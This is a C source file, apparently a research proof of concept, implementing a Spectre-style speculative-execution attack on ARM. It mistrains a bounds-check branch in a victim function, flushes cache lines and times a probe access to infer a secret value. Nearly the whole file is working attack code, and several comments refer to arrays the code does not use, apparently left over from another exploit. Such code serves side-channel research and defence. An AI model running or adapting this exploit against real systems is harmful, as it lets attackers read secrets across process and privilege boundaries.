#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arm_neon.h>
#include "timing.h"
#include "cache.h"
#include <assert.h>
#include <string.h>
// #include <x86intrin.h>
// #include <xmmintrin.h>

#define FAST 0x40f0000000000000
#define SLOW 0x0010deadbeef1337
#define SIZE 256
#define STRIDE 512

int leakValue();


uint64_t val __attribute__((aligned(2048))) = 0xbeefbeef;
uint64_t val2 __attribute__((aligned(2048))) = 0x1234567;
static uint8_t array[SIZE * STRIDE] __attribute__((aligned(2048)));

cache_ctx_t val_context __attribute__((aligned(2048)));
cache_ctx_t val2_context __attribute__((aligned(2048)));
cache_ctx_t secret_context __attribute__((aligned(2048)));
cache_ctx_t is_public_context __attribute__((aligned(2048)));
cache_ctx_t arr_context __attribute__((aligned(2048)));


int is_public  __attribute__((aligned(2048))) = 0x00000001;
int secret __attribute__((aligned(2048)))= 0xdeadbabe ;

//32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25

void victim_function(register int secret_val, int isPublic)
{
    if (isPublic < array[0x2 * STRIDE]) {
        if(secret == 0) {
          double tmp2;
          memcpy((void*)&tmp2, (void *)&val, sizeof(tmp2));
        }
        else {
          double tmp3; 
          memcpy((void*)&tmp3, (void *)&val2, sizeof(tmp3));
        }
  }
  return ;
}


cache_ctx_t * array_ctx = NULL;
size_t training_offset;

void setup() {
    for (int i = 0; i < sizeof(array); i++)
      array[i] = 0x0;
    array[0x2 * STRIDE] = 10;
    
    arr_context = cache_remove_prepare(&array[0x2 * STRIDE]);
    val_context = cache_remove_prepare(&val);
    val2_context = cache_remove_prepare(&val2);
    is_public_context = cache_remove_prepare(&is_public);
    secret_context = cache_remove_prepare(&secret);
    return;
}


int leakValue() {

    int num_hits = 0 ;

    memory_fence();
    
    // mistrain + access out of bounds
     
    for(int i = VICTIM_CALLS; i >= 0; i--){ // do VICTIM_CALLS calls to the victim function (per measurement)
        
        // in-bounds or out of bounds
        // this is leak_offset every TRAINING + 1 iterations and training_offset otherwise
        // we try to avoid branches, so it is written that way.
        // size_t x = (!(i % (TRAINING + 1))) * (leak_offset - training_offset) + training_offset;
        //int x = (i == 0) ? 0 : 10;
        int x = (i == 0) * 10;
        
        // remove array_size from cache
        cache_remove(arr_context);
        cache_remove(val_context);
        cache_remove(val2_context);
        cache_remove(is_public_context);
        //cache_remove(secret_context);

        //make sure everything is removed from cache
        memory_fence();

        // call to vulnerable function.
        // Either training (in-bound) or attack (out-of-bound) call.
        // If this is an attack call and the mistraining was successful, an entry of array2 will be cached
        //  directly dependend on the entry in array1 we want to leak!
        //printf("%d, %d\n", i, x);
        victim_function(secret, x);
        memory_fence();

     //noops
    //asm volatile (".rept 5000;\nnop;\n.endr;");
    }
        
    // measurement
    
    // measure access time to each entry in array2.
    // increment cache_hits at the corresponding position on cache hit.
    uint64_t time;

    // measure time
    //memory_access(&global_variable);
    time = probe(&val);

    //assert(time != 0);
    num_hits += (time); // && time makes sure the time wasn't 0 (0 = the timer is not running)
    
    
    // return offset of array2 with most cache hits 
    // (should be the value read from out-of-bound access to array1 during mis-speculation)
    return num_hits;
}


int main(int argc, char *argv[])
{
    timer_start();
    
    //printf("[Spectre Variant %d for Variable Time Instructions]\n", VARIANT);
    
    secret = atoi(argv[1]);
    int guess = 0;
    
    uint64_t result;
    
    memory_fence();
    
    //puts(" ---- SETUP ---- ");
    //fflush(stdout);
    
    setup();
    memory_fence();
    
    
    result = leakValue();
    printf("%3lld ", result);
    
    timer_stop();

}

